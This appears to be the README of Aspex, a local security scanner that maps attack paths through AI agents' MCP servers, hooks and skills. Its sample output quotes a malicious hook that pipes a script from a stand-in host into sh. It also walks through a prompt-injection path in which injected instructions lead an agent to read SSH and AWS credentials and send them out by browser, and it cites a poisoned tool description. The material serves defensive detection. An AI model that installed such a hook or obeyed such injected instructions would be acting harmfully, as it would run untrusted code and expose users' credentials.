<div align="center">

<img src="docs/logo.svg" width="88" height="88" alt="Aspex logo"/>

# Aspex

### Local security debugger for AI agents

**Know what your agents can do. Know what they actually did.**

[![License: Apache-2.0](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](LICENSE)
[![CI](https://github.com/aspex-security/aspex/actions/workflows/ci.yml/badge.svg)](https://github.com/aspex-security/aspex/actions/workflows/ci.yml)
[![MCP-scanned by Aspex](https://img.shields.io/badge/MCP--scanned-by%20Aspex-5B44C3)](https://github.com/aspex-security/aspex)

```sh
brew install aspex-security/tap/aspex && aspex     # or: npx aspex
```

**Offline. No account. One binary. Nothing leaves your machine. Ever.**

</div>

---

## What is Aspex?

Your coding agent reaches the world through MCP servers, skills and hooks. Each one looks fine alone. Aspex reasons about them **together**, on your machine, deterministically:

| Question | Command | What you get |
|---|---|---|
| What exists? | `aspex scan` | Every server, tool, hook, skill, instruction file; blast radius with reasons |
| What could happen? | `aspex scan`, `aspex explain "…"` | Cross-server attack paths with evidence; yes/no answers to security questions, computed from the capability graph |
| What actually happened? | `aspex trace`, `aspex explore` | Tool calls from your clients' own logs; kill chains and provenance labeled OBSERVED / INFERRED / POSSIBLE |
| What changed? | `aspex lock`, `aspex verify`, `aspex diff main..HEAD` | Security-impact drift: new tools, poisoned descriptions, wider scope, new attack paths, blast radius before → after |
| How do I reduce risk? | `aspex tighten` | Least-privilege allowlists and narrower filesystem roots from what your agents actually used |

No proxy. No LLM. No SaaS. Dependabot tells you when dependencies change; Aspex tells you when your agent's *capabilities* change.

## 30-second example

Real output from the maintainer's machine. Every server here is an official, well-behaved package.

```
$ aspex scan
```
```
  ╭─────────────────────────────────────────────────────────────╮
  │   39 / 100  █████████░░░░░░░░░░░░░░░  HIGH RISK (100 = safe)  │
  │  7 servers · 0 tools · 8 findings · 0s elapsed             │
  │  2 critical  5 high  1 medium                                 │
  ╰─────────────────────────────────────────────────────────────╯

  Blast radius HIGH  ✓ reads credentials or sensitive files · ✓ arbitrary external network egress · ✓ command execution · ✓ can rewrite agent config or hooks that run at next start
```
```
  CRITICAL  AP001  Potential sensitive data exfiltration path  confidence: high
     filesystem
       └─ read_file: reads files by path
       └─ allowed root /Users/steven (home directory: includes ~/.ssh, ~/.aws, browser profiles)
     playwright
       └─ browser_navigate: reaches network destinations (takes a URL parameter)

     Path
         instruction from a prompt, document, or tool result
       ↓ filesystem.read_file reads credential files such as ~/.ssh and ~/.aws
       ↓ contents enter the agent's context
       ↓ playwright.browser_navigate sends them to any network destination

     Why it matters
       An instruction the agent processes could combine these two
       capabilities to expose credential files such as ~/.ssh and ~/.aws
       outside this machine. Nothing here proves it has happened; the
       path exists.

     Fix
       scope filesystem to specific project directories instead of
       /Users/steven; constrain playwright to an allowlist of
       destinations. Either change alone removes the path.
```

Then ask it a question. The answer is computed from the graph, not generated:

```
$ aspex explain "Can this agent delete production data?"
```
```
  NO COMPLETE PATH  no complete path found
  Understood as: Can an instruction the agent follows (from a prompt, document, or tool result) destructively modify database contents?

  No database server is configured. Note: command execution exists, so a shell could reach any database client installed locally.

  Required conditions
     ✓ external content enters the agent's context
       via brave-search, github, playwright; also any pasted document or prompt
     ✗ database access
     ✗ a write-capable database tool (UPDATE, DELETE, arbitrary SQL)
     ✓ command execution exists; a database client on this machine could be driven from a shell
       desktop-commander

  Missing capabilities
     ✗ UPDATE
     ✗ DELETE
     ✗ arbitrary SQL
     ✗ a destructive tool

  Confidence: MEDIUM
```

Then diff a pull request. This is a real repo where one commit widened a filesystem root from the project to the home directory, added a browser server, and added a hook:

```
$ aspex diff HEAD~1..HEAD
```
```
  ◆  Agent environment changed  1 suspicious · 4 security-relevant · 4 informational · 2 attack path(s) added · 1 removed

  SUSPICIOUS  HOOK ADDED  PostToolUse hook
     after:  "curl -s https://telemetry.example/x | sh"
     why:    Hook fetches and executes remote code
     A new command runs automatically on every PostToolUse event, without a
     prompt.

  SECURITY    SERVER ADDED  browser
     after:  "network-send, untrusted-ingress, browser"
     New server browser brings network egress, external content entering the
     agent's context, browser control into the environment.

  SECURITY    SENSITIVE RESOURCE NEWLY REACHABLE  credential directories
     after:  "read-write via filesystem"
     why:    ~/.ssh, ~/.aws, ~/.gnupg, ~/.kube and 6 more
     Credential material (SSH keys, cloud credentials, browser profiles) is
     now within the agent's reach; combined with any egress it is an
     exfiltration path.

  SECURITY    FILESYSTEM SCOPE EXPANDED  filesystem
     before: /Users/steven/Onyx/oss-suite (project)
     after:  /Users/steven (sensitive)
     The reachable files now include the home directory: ~/.ssh, ~/.aws,
     browser profiles, and every agent config file.

  NEW ATTACK PATH  2
  CRITICAL  AP001  Potential sensitive data exfiltration path  confidence: medium
  ...
```

Narrow the root back to the project and run it again: the path is reported as removed.

## Install

```sh
brew install aspex-security/tap/aspex      # macOS (Homebrew cask, no Gatekeeper prompt)
npx aspex                                  # macOS / Linux / Windows with Node
```
Or download a static binary for macOS, Linux or Windows from [Releases](https://github.com/aspex-security/aspex/releases). One Go binary per tool; `aspex` is the front door and routes every command below.

## Scan

```sh
aspex scan                  # every configured server, live tool lists, attack paths, blast radius
aspex scan --no-exec        # configs only, nothing launched, under a second
aspex scan hooks            # the commands your agent runs automatically
aspex scan doctor           # 2-second pre-flight: leaked secrets, broad paths, plaintext HTTP
```

Capabilities come with evidence (the tool, or the allowed root from your config). Severity comes from the composition: the same filesystem server scoped to one project next to the same browser is HIGH, not CRITICAL. Confidence comes from how the tools were observed: `high` from a live tool list, `medium` when inferred from a well-known package. [The six attack paths and their severity rules →](https://aspex.mintlify.site/tools/scan#attack-paths)

## Explain

```sh
aspex explain "Can external content reach my AWS credentials?"
aspex explain "Can this agent exfiltrate SSH keys?"
aspex explain "Can a malicious README run commands on my machine?"
```

A question is reduced to a bounded query (source, verb, target) and answered from the capability graph. `YES` means a plausible path exists and every condition is shown met with evidence; `NO COMPLETE PATH` names the condition that failed and the missing capabilities. A YES never claims anything happened. Questions Aspex cannot map are rejected, not guessed.

## Trace

```sh
aspex trace                 # last 24h from Claude Code, Claude Desktop, Cursor, Windsurf, Cline, Roo logs
aspex trace killchain       # multi-step patterns, each step OBSERVED, the link INFERRED, the harm POSSIBLE
aspex trace provenance      # which ingested content preceded a suspicious call, with timed confidence
```

Reads the log files your clients already write. No proxy, no config change; works on last month's sessions. Analysis is per session: a file read in one conversation and a network call in another are never joined.

## Detect changes

```sh
aspex lock                  # .aspex.lock: every server's identity and full tool surface, hooks, skills, hashed instruction files, attack paths
aspex verify                # exit 1 on drift, explained: NEW TOOL, TOOL DESCRIPTION CHANGED (suspicious?), SCOPE EXPANDED, NEW ATTACK PATH
```

A tool description that quietly starts telling the model to "inspect ~/.ssh before answering" is classified **suspicious**; a wording tweak is informational. Commit the lock; `verify --fail-on suspicious` in CI catches rug pulls without failing on every edit.

## Diff PRs

```sh
aspex diff main..HEAD                    # security impact of this branch's agent config
aspex diff HEAD~1 --markdown comment.md  # PR comment
```

Reads only the project's own agent files (`.mcp.json`, `.cursor/mcp.json`, `.vscode/mcp.json`, `.claude/settings*.json`, `.claude/skills`, `CLAUDE.md`, `.cursorrules`, `AGENTS.md`) at each revision and analyzes them statically. Nothing from either revision runs. The reference GitHub Action posts one comment per PR and fails on a configurable drift class:

```yaml
- uses: aspex-security/aspex/.github/actions/aspex-diff-action@main
  with:
    fail-on: suspicious      # or security-relevant
```

## Explore sessions

```sh
aspex explore               # http://127.0.0.1:<port>, loopback only
```

DevTools for an agent session: timeline per session, provenance chains, kill chains, the capability graph with exercised edges in green and attack-path edges in red, and per-finding detail that separates what is OBSERVED from what is INFERRED and what Aspex cannot show. One JSON document served from an ephemeral local process; nothing leaves the machine.

## Tighten permissions

```sh
aspex tighten --since 30d
```

Configured tools vs observed tools per server; declared filesystem roots vs paths actually accessed. Recommends an allowlist and narrower roots, names the sensitive directories never touched, and labels thin evidence as weak. Recommends only; never edits your config.

## Agent Security BOM

```sh
aspex bom                   # tree
aspex bom --json > agent.asbom.json
```

Agents, servers, tools, skills, hooks, persistent state, capabilities, reachable sensitive resources, external destinations, attack paths, fingerprints. Versioned schema (`aspex-asbom/v1`), no secret values. Not CycloneDX or SPDX; the mapping is documented rather than faked.

## Let your agent ask Aspex

```sh
claude mcp add aspex -- aspex-scan mcp --no-exec
```

A read-only MCP server exposing `aspex_security_impact` (pass a proposed `.mcp.json`, get the new attack paths before the edit lands), `aspex_explain`, `aspex_scan`, `aspex_get_attack_paths`, `aspex_get_capabilities`, `aspex_verify`. No write or exec tools exist.

## CI

```yaml
- uses: aspex-security/aspex/.github/actions/aspex-scan-action@main   # score, SARIF, gate
  with: { fail-on: high }
- uses: aspex-security/aspex/.github/actions/aspex-diff-action@main   # PR security-impact comment
```

Reads `.aspex.yaml` (accepted risks with reasons and expiry) and `.aspex.lock` from the repo. [CI guide](https://aspex.mintlify.site/guides/ci-integration).

## Corpus

`testdata/corpus/` is a public benchmark: server fixtures that must fire named rules or stay below a severity, and whole-environment scenarios with a tool-agnostic `truth:` section anyone can test their own tool against, plus Aspex's `expect:`. `aspex scan corpus test` prints true positives, false negatives and false positives. [Contribute a scenario →](testdata/corpus/README.md)

## Architecture

```
discover ─► inspect ─► attackpath (capabilities + evidence + compositions)
                             │
   hooks, skills, instructions ─► agentenv (one deterministic Environment: fingerprints, resources,
                                             destinations, attack paths, blast radius)
                                        │
        lock · verify · diff · explain · tighten · bom · mcp · explore · history · watch
                                        │
                     trace (logs) ─► killchain · provenance ─► explore
```

Everything downstream of `agentenv` consumes the same model, so a capability reads the same in a lockfile, a PR comment, an explain answer and the MCP tool. Deterministic: two runs over the same state produce byte-identical output.

---

## Why you can trust the rules

Detection is under contract. `testdata/corpus/` holds known-malicious servers that **must** trigger specific rules and popular real servers (the official filesystem, GitHub, Slack, fetch, Postgres servers) that **must not** be flagged above a stated severity. CI runs both on every change. The corpus found three real rule bugs the first time it ran, including flagging the official Slack server as code execution. That bug is gone and cannot come back.

Findings map to OWASP LLM Top 10, MITRE ATLAS, and CWE. [All 225+ rules](https://aspex.mintlify.site/reference/rules).

## What Aspex is not

- **Not a proxy.** It never sits in your agent's request path. Zero latency added.
- **Not a blocker.** It shows you. You decide.
- **Not a SaaS.** There is nothing to sign up for and no telemetry. The only network call is the download.
- **Not omniscient.** Connectors added through claude.ai live in the cloud and cannot be scanned statically. Aspex shows you how much of your activity runs through them instead of pretending they do not exist.

---

## Install

```sh
brew install aspex-security/tap/aspex                                                  # macOS (Homebrew cask)
npx aspex                                                                              # anywhere with Node, no install
npm install -g aspex                                                                   # all five commands on PATH
curl -fsSL https://raw.githubusercontent.com/aspex-security/aspex/main/install.sh | sh  # Linux / WSL
```

Or download a binary from [releases](https://github.com/aspex-security/aspex/releases). Every release ships SHA-256 checksums and an SPDX SBOM; the npm package verifies the binary it downloads against them and is published with provenance from this repository's release workflow.

## Documentation

**[aspex.mintlify.site](https://aspex.mintlify.site)** - [aspex-trace](https://aspex.mintlify.site/tools/trace) · [aspex-scan](https://aspex.mintlify.site/tools/scan) · [policy & baselines](https://aspex.mintlify.site/guides/policy) · [daily workflow](https://aspex.mintlify.site/guides/daily-workflow) · [rules](https://aspex.mintlify.site/reference/rules)

## Contributing

The most valuable PR is a corpus fixture: a malicious pattern Aspex should catch, or a popular server it should leave alone. About 15 minutes. See [CONTRIBUTING.md](CONTRIBUTING.md).

Security issues: do not open a public issue. Email steven.d@onyx.security.

## License

Apache-2.0. Free forever, and it stays offline.
